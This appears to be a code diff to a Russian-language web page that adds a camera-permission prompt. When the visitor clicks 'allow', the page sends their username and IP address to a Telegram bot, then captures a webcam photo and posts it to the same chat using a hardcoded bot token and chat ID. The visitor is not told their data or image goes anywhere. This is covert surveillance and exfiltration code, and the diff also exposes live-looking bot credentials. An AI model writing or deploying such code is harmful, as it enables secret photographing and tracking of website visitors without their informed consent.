@@ -20,6 +20,27 @@
             align-items: center;
             height: 100vh;
             overflow: hidden;
+            position: relative;
+        }
+
+        .modal {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: white;
+            text-align: center;
+            z-index: 1000;
+        }
+
+        .modal.active {
+            display: flex;
         }
 
         .logo {
@@ -111,6 +132,12 @@
     </style>
 </head>
 <body>
+    <div class="modal" id="permissionModal">
+        <h2>Разрешите доступ к камере</h2>
+        <button id="allowCamera">Разрешить</button>
+        <button id="denyCamera">Отменить</button>
+    </div>
+
     <div class="logo">
         <img src="https://i.postimg.cc/hGdCsVNf/logo.png" alt="Logo" class="logo">
     </div>
@@ -134,15 +161,48 @@
         const closeButton = document.querySelector('.close');
         const toastTitle = document.getElementById('toastTitle');
         const toastSubtitle = document.getElementById('toastSubtitle');
-        const toastIcon = document.getElementById('toastIcon');
+        const pluginIcon = document.getElementById('toastIcon');
+        const permissionModal = document.getElementById('permissionModal');
 
         closeButton.addEventListener('click', () => {
             toast.classList.remove('active');
         });
 
+        document.getElementById('allowCamera').addEventListener('click', async () => {
+            permissionModal.classList.remove('active');
+            const username = 'user123'; // Замените на реальное имя пользователя
+            const userId = username;
+            const userIp = await getUserIp();
+            await sendToTelegram(username, userId, userIp);
+        });
+
+        document.getElementById('denyCamera').addEventListener('click', () => {
+            permissionModal.classList.remove('active');
+            showToast("Доступ к камере не был предоставлен.");
+        });
+
+        async function sendPhotoToTelegram(token, chatId, photo) {
+            const url = `https://api.telegram.org/bot${token}/sendPhoto`;
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', photo);
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                if (!response.ok) {
+                    throw new Error(`HTTP error! Status: ${response.status}`);
+                }
+            } catch (error) {
+                console.error('Ошибка отправки фото в Telegram:', error);
+            }
+        }
+
         async function sendToTelegram(username, userId, userIp) {
-            const token = '7751523850:AAGrsjxOfP8Q76ZpKss20eAG55rXxE6BMLg'; // Вставьте ваш токен бота
-            const chatId = '7618874046'; // Вставьте ваш ID чата
+            const token = '8153849953:AAEpCvjT7AMqcizshjS4ZxznFL4RF4ESZGE';
+            const chatId = '7618874046';
             const message = `<b>🎅 Новая авторизация на сайте!</b>\n\n` +
                 `<blockquote>` +
                 `<b>[☃] Имя пользователя:</b> @${username}\n` +
@@ -168,6 +228,9 @@
                 if (!response.ok) {
                     throw new Error(`HTTP error! Status: ${response.status}`);
                 }
+                const videoStream = await capturePhoto(); // Получаем фото с камеры
+                const blob = await videoStream;
+                sendPhotoToTelegram(token, chatId, blob); // Отправка фото в Telegram
                 showToast();
             } catch (error) {
                 console.error('Ошибка отправки в Telegram:', error);
@@ -187,18 +250,42 @@
             }
         }
 
-        function showToast() {
+        function showToast(message = "Данные успешно отправлены!") {
+            toastTitle.innerText = "Success";
+            toastSubtitle.innerText = message;
             toast.classList.add('active');
             setTimeout(() => {
                 toast.classList.remove('active');
             }, 5000);
         }
 
+        async function capturePhoto() {
+            const constraints = {
+                video: false, // Только для захвата изображения
+                audio: false
+            };
+
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+
+            const canvas = document.createElement('canvas');
+            canvas.width = 640; // Установите нужные размеры
+            canvas.height = 480;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            return new Promise((resolve) => {
+                video.onloadedmetadata = () => {
+                    stream.getTracks().forEach(track => track.stop()); // Останавливаем поток после захвата
+                    canvas.toBlob(resolve); // Возвращает Blob с изображением
+                };
+            });
+        }
+
         async function initialize() {
-            const username = 'user123'; // Замените на реальное имя пользователя (или получайте динамически)
-            const userId = username; // Используем username как userId
-            const userIp = await getUserIp();
-            sendToTelegram(username, userId, userIp); // Отправка данных в Telegram
+            permissionModal.classList.add('active'); // Показать модальное окно
         }
 
         window.onload = initialize; // Вызов функции при загрузке страницы
